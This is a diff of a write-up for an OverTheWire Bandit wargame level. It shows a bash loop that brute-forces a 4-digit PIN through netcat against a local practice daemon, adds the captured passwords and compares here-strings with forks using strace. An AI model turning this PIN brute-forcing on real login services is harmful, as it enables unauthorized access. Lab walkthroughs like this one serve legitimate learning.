@@ -20,18 +20,19 @@ You do not need to create new connections each time
 
 another script to construct yay :D
 
-firstly let's see if a connection can be established
+firstly let's see how the daemon handles input after establishing a connection
 
 ```sh
 nc localhost 30002
-# I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+# I am the pincode checker for user bandit25. Please enter the password
+# for user bandit24 and the secret pincode on a single line, separated by a space.
 hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv 6969
 # Wrong! Please enter the correct current password and pincode. Try again.
 ```
 
-bash is somewhat straight forward, somewhat like python if i had to make an analogy, so constructing a loop is as easy as `for i in {start..stop}; do ... done`, so let's do that then
+bash is somewhat straight forward, a little bit of python, seasoned with bbq <or insert your favorite flavor here> - if i had to make an analogy
 
-we should also filter out all the Wrong responses so we only end up with the right password at the end, this can be achieved with [`grep -v`](https://askubuntu.com/questions/1153513/what-does-grep-v-grep-mean-and-do#answer-1153520) to invert the match
+so constructing a loop is as easy as `for i in {start..stop}; do ... done`, let's do that then while also applying a filter for messages we don't want to see ("Wrong"). this can be achieved with [`grep -v`](https://askubuntu.com/questions/1153513/what-does-grep-v-grep-mean-and-do#answer-1153520) to invert the match
 
 ```sh
 #!/usr/bin/env bash
@@ -39,13 +40,18 @@ we should also filter out all the Wrong responses so we only end up with the rig
 PASS="hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv"
 
 for i in {0000..9999}; do
-  echo "$PASS $i"
+  echo "$PASS $i" # as requested by the daemon
 done | nc localhost 30002 | grep -v Wrong
 ```
 
 `nc` is deliberately **not** constructed inside the loop, - putting it there would open a fresh connection per guess (basically 10,000 handshakes). kept outside, `nc` runs once & the for loop's output streams through the pipe into the single process, meaning all guesses ride over one singular tcp connection
 
 > i hope that was somewhat understandable
+
+```sh
+# Correct!
+# The password of user bandit25 is SoHfqMOEqIX2IYKVciZxvgpR9a2Djx4P
+```
 
 ---
 
@@ -59,7 +65,11 @@ PASS="hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv"
 grep -v Wrong <<<"$(nc localhost 30002 <<<"$(printf "$PASS %04d\n" {0..9999})")"
 ```
 
-the inner [here-string](https://tecadmin.net/bash-here-strings/) `<<<` feeds the generated guess into `nc` -> its output captured by `$(..)` & the outer `<<<` feeds that into grep
+the inner [here-string](https://tecadmin.net/bash-here-strings/) (`<<<`) feeds the generated guess into `nc` & sends its output captured by `$(..)`
+
+finally, the outer here-string feeds that into the inverted grep match
+
+> basically like math, starting from the inner most parentheses
 
 although there are still [forks](https://stackoverflow.com/questions/18760891/please-explain-fork#answer-18770480) (the `$()` part), avoiding pipes isn't inherently bad, just a nice way to see different ways achieving the same result
 
@@ -77,17 +87,17 @@ while IFS= read -r line; do
 done <<<"$resp"
 ```
 
-convince yourself, `.. is a shell builtin` except for `nc`
+convince yourself, the command below will return `<command> is a shell builtin` except for `nc`
 
 ```sh
 type -a printf echo nc
 ```
 
-if you still don't believe me (i had fun researching lol), below are two examples of printing "hi" to stdout, one with here-string `<<<` & one with a fork `$()`
+if you still don't believe me (i had fun researching lol), below are two examples of printing "hi" to stdout, one with a here-string & one with a fork
 
 ```sh
 strace -f -e trace=clone,fork,vfork,execve \
-bash -c 'while read -r line; do :; done <<< "hi"'
+bash -c 'while read -r line; do :; done <<< "hi"' # here-string
 
 execve("/usr/bin/bash", ["bash", "-c", "while read -r line; do :; done <"...],
   0x7ffc3ee9da08 /* 51 vars */) = 0
@@ -95,7 +105,7 @@ execve("/usr/bin/bash", ["bash", "-c", "while read -r line; do :; done <"...],
 
 # now compared to a fork which would call `clone(..)` specifically
 strace -f -e trace=clone,fork,vfork,execve \
-bash -c 'x=$(echo hi)'
+bash -c 'x=$(echo hi)' # fork
 
 execve("/usr/bin/bash", ["bash", "-c", "x=$(echo hi)"],
   0x7ffe74d43918 /* 51 vars */) = 0
@@ -110,3 +120,5 @@ clone(child_stack=NULL,
   si_stime=0} ---
 +++ exited with 0 +++
 ```
+
+in all honesty, all versions have about the same runtime +-0.05ms difference give or take, but for larger projects, please consider avoiding forks & external calls wherever possible!
